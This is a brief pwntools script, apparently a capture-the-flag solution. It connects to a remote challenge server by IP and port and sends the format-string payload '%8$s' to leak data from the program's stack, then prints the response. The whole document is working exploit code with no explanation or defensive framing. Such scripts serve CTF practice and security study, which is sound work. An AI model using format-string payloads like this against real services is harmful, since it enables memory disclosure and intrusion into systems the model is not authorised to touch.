from pwn import *

# p = process('./chall')
p = connect('45.77.39.59', 10003)

payload = b'%8$s'
p.recvuntil(b'> ')
p.sendline(payload)
print(p.recv())